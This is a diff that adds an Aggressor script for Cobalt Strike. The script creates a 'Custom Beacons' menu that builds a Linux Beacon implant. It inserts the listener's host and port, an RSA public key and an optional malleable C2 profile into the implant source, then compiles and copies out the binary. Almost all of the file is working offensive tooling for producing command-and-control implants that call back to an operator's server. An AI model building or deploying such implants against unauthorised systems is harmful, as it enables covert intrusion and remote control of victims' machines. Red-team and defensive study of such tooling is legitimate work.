@@ -1,0 +1,187 @@
+$CustomBeaconProjectFolder = "/home/s3th/CobaltStrike-Linux-Beacon/"; # <-- SET THIS to the absolute path of CobaltStrike-Linux-Beacon on the current machine
+$GeneratePayloadDirectory = $CustomBeaconProjectFolder . "/generate-payload/";
+$ImplantSrcDirectory = $CustomBeaconProjectFolder . "/implant/";
+
+menubar("Custom Beacons", "generate");
+popup generate {
+	item "Generate Custom Beacon" { genBeaconMenu(); }
+};
+
+sub genBeaconMenu {
+	$dialog = dialog("Custom Beacon Generator", %(listener => "Select Listener: ", Beacon_name => "Beacon_x64", profile => "", output_dir => ""), &genPayload);
+	dialog_description($dialog, "Creates a Linux Beacon implant with optional malleable C2 profile.\n\nListener: Select an HTTP/HTTPS listener (required)\nBeacon Name: Output executable name\nProfile: Browse to select .profile file (optional, leave empty for default)\nOutput Dir: Where to copy the beacon after build (optional)");
+	drow_listener_stage($dialog, "listener", "Listener: ");
+	drow_text($dialog, "Beacon_name", "Beacon Name: ");
+	drow_file($dialog, "profile", "Malleable Profile (optional): ");
+	drow_text($dialog, "output_dir", "Output Directory (optional): ");
+	dbutton_action($dialog, "Generate");
+	dialog_show($dialog);
+}
+
+sub genPayload {
+	# Check OS
+	if (substr(cwd(), 0, 1) ne "/") {
+		show_message("Windows not supported yet!");
+		return;
+	}
+
+	$filename = $3['Beacon_name'];
+
+	# Null-safe defaults
+	if ($filename eq $null || "" eq $filename) { $filename = "Beacon_x64"; }
+
+	# Validate listener
+	if ($3['listener'] eq $null || $3['listener'] ismatch "Select Listener: ") {
+		show_message("Please select a Listener.");
+		return;
+	}
+
+	# Get listener info
+	$HTTPSvalue = "0";
+	$ListenerName = $3['listener'];
+	$payloadType = listener_info($ListenerName, "payload");
+
+	# Check for null payload type
+	if ($payloadType eq $null) {
+		show_message("Could not retrieve listener information. Please ensure the listener exists.");
+		return;
+	}
+
+	if ($payloadType ne "windows/beacon_http/reverse_http" && $payloadType ne "windows/beacon_https/reverse_https") {
+		show_message("Only reverse_http and reverse_https listeners are supported.");
+		return;
+	}
+	if ($payloadType eq "windows/beacon_https/reverse_https") {
+		$HTTPSvalue = "1";
+	}
+	$TargetServer = listener_info($ListenerName, "host");
+	$TargetPort = listener_info($ListenerName, "port");
+
+	# Check for null server/port
+	if ($TargetServer eq $null || $TargetPort eq $null) {
+		show_message("Could not retrieve listener host/port information.");
+		return;
+	}
+
+	# Step 0: Insert malleable profile (if provided)
+	$profilePath = $3['profile'];
+	if ($profilePath ne $null && $profilePath ne "" && -exists $profilePath) {
+		println("[0/6] Inserting malleable profile: " . $profilePath);
+		$profileHeader = $ImplantSrcDirectory . "headers/profile_generated.h";
+		$command = "bash gen_profile.sh " . $profilePath . " " . $profileHeader;
+		$process = exec($command, $null, $GeneratePayloadDirectory);
+		if ($process ne $null) {
+			@data = readAll($process);
+			foreach $line (@data) { println($line); }
+			closef($process);
+		} else {
+			println("[0/6] ERROR: Failed to execute gen_profile.sh");
+		}
+	} else {
+		if ($profilePath ne $null && $profilePath ne "" && !-exists $profilePath) {
+			println("[0/6] WARNING: Profile file not found: " . $profilePath);
+			println("[0/6] Falling back to default profile");
+		} else {
+			println("[0/6] Using default profile");
+		}
+		$profileHeader = $ImplantSrcDirectory . "headers/profile_generated.h";
+		$defaultHeader = $ImplantSrcDirectory . "headers/profile_generated.h.default";
+		if (-exists $defaultHeader) {
+			$command = "cp \"" . $defaultHeader . "\" \"" . $profileHeader . "\"";
+			$process = exec($command, $null, $ImplantSrcDirectory);
+			if ($process ne $null) { closef($process); }
+		} else {
+			show_message("ERROR: Default profile header not found at " . $defaultHeader);
+			return;
+		}
+	}
+
+	# Step 1: Insert listener info
+	println("[1/6] Listener: " . $TargetServer . ":" . $TargetPort . " HTTPS=" . $HTTPSvalue);
+	$command = "python3 InsertListenerInfo.py " . $TargetServer . " " . $TargetPort . " " . $HTTPSvalue;
+	$process = exec($command, $null, $GeneratePayloadDirectory);
+	if ($process ne $null) {
+		@data = readAll($process);
+		foreach $line (@data) { println($line); }
+		closef($process);
+	} else {
+		println("[1/6] ERROR: Failed to execute InsertListenerInfo.py");
+	}
+
+	# Step 2: Insert public key
+	$publickeylocation = $GeneratePayloadDirectory . "publickey.txt";
+	if (-exists $publickeylocation) {
+		# ok
+	} else {
+		show_message("publickey.txt not found at " . $publickeylocation . "\nRun: cd generate-payload && ./generate_rsa_keys.sh");
+		return;
+	}
+	println("[2/6] Inserting public key...");
+	$command = "python3 InsertPublicKey.py";
+	$process = exec($command, $null, $GeneratePayloadDirectory);
+	if ($process ne $null) {
+		@data = readAll($process);
+		foreach $line (@data) { println($line); }
+		closef($process);
+	}
+
+	# Step 3: Build implant
+	println("[3/6] Building implant...");
+	$command = "make clean -f Makefile OUTPUT=" . $filename;
+	$process = exec($command, $null, $ImplantSrcDirectory);
+	if ($process ne $null) { @data = readAll($process); closef($process); }
+
+	$command = "make -f Makefile OUTPUT=" . $filename;
+	$process = exec($command, $null, $ImplantSrcDirectory);
+	if ($process ne $null) {
+		@data = readAll($process);
+		foreach $line (@data) { println($line); }
+		closef($process);
+	}
+
+	# Step 4: Cleanup
+	println("[4/6] Cleanup...");
+	$command = "python3 RemovePublicKey.py";
+	$process = exec($command, $null, $GeneratePayloadDirectory);
+	if ($process ne $null) {
+		@data = readAll($process);
+		foreach $line (@data) { println($line); }
+		closef($process);
+	}
+
+	# Step 5: Copy to output directory
+	$final = $ImplantSrcDirectory . "bin/" . $filename;
+	$outputDir = $3['output_dir'];
+	if ($outputDir ne $null && $outputDir ne "") {
+		if (-exists $outputDir) {
+			$dest = $outputDir . "/" . $filename;
+			$command = "/bin/cp " . $final . " " . $dest;
+			$process = exec($command, $null, $ImplantSrcDirectory);
+			if ($process ne $null) {
+				readAll($process);
+				closef($process);
+			}
+			if (-exists $dest) {
+				println("[5/6] Copied to: " . $dest);
+				$final = $dest;
+			} else {
+				println("[5/6] ERROR: Copy failed. Binary remains at: " . $final);
+			}
+		} else {
+			println("[5/6] WARNING: Output directory not found: " . $outputDir . " (skipping copy)");
+		}
+	}
+
+	# Step 6: Final
+	println("[6/6] Done!");
+	if ($profilePath ne $null && $profilePath ne "") {
+		$profileDisplay = $profilePath;
+	} else {
+		$profileDisplay = "default";
+	}
+	if (-exists $final) {
+		show_message("Beacon generated successfully!\n\nPath: " . $final . "\nListener: " . $ListenerName . "\nProfile: " . $profileDisplay);
+	} else {
+		show_message("WARNING: Build reported success but file not found at: " . $final);
+	}
+}
